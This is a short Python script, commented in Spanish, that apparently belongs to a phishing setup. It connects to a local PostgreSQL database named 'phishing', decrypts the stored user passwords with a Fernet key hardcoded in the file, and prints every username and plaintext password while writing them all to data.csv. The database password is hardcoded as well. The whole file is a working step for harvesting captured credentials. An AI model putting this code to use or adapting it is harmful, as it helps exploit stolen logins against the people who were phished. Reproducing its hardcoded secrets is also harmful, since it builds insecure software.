import psycopg2
from cryptography.fernet import Fernet

# Función utilizada para establecer la concexión con la base de datos PostgresSQL
def dbConnection():
    conn = psycopg2.connect(database="phishing", user='postgres', password='postgres2020', host='127.0.0.1',
                            port='5432') # Se establecen los parametros para la conexión con la base
    conn.autocommit = True # Se establecen los commits como automaticos
    return conn # Se retorna el objeto obtenido de la conexión con la base

# Función utilizada para cerrar la conexión a la base de datos
# Recibe la conexión creada
def dbClose(conn):
    conn.close() # Termina la conexión con la base de datos

# Función utilizada para descifrar texto mediante Fernet
def uncipher(string):
    string = string.encode('utf-8')
    key = b'_2O_3XqtIimG2Vk53abrtzjhCklbJ9251sc6s-qwiyw=' # Clave utilizada para generar el cifrado
    cipherSuite = Fernet(key) # Se inicializa el objeto para Fernet con la clave generada
    result = (cipherSuite.decrypt(string)) # Se descifra y retorna el resultado obtenido
    result = bytes(result).decode("utf-8")
    return result

#Función utilizada para seleccionar los nombres de usuarios y contraseñas de la base de datos postgresql.
#Además, guarda los datos recuperados en el archivo data.csv.
def selectData(cursor):
    file = open("data.csv", "w")
    sql = """SELECT id, "user", password FROM public.users;"""
    cursor.execute(sql)
    result = cursor.fetchall()
    for row in result:
        print(f"id = {row[0]}, username = {row[1]}, password = {uncipher(row[2])}")
        file.write(f"id = {row[0]}, username = {row[1]}, password = {uncipher(row[2])}\n")
    file.close()

#Función principal del programa
def main():
    connection = dbConnection()  # Se establece la conexión con la base
    cursor = connection.cursor()  # Se crea un cursor para realizar consultas
    selectData(cursor)
    dbClose(connection)


if __name__ == '__main__':
    main()
